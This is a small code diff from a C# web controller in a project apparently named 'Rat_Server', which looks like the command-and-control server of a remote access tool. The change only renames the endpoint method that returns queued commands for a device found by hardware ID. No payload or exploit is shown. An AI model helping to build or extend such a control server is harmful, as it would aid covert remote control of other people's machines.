@@ -35,7 +35,7 @@ namespace Rat_Server.Controllers
         }
 
         [HttpGet("GetCommands/{deviceId}")]
-        public async Task<ActionResult<List<Command>>> GetDeviceCommands(string deviceId)
+        public async Task<ActionResult<List<Command>>> GetCommands(string deviceId)
         {
             if (await _context.Devices.FirstOrDefaultAsync(d => d.Hwid.ToString().Equals(deviceId)) == null)
             {
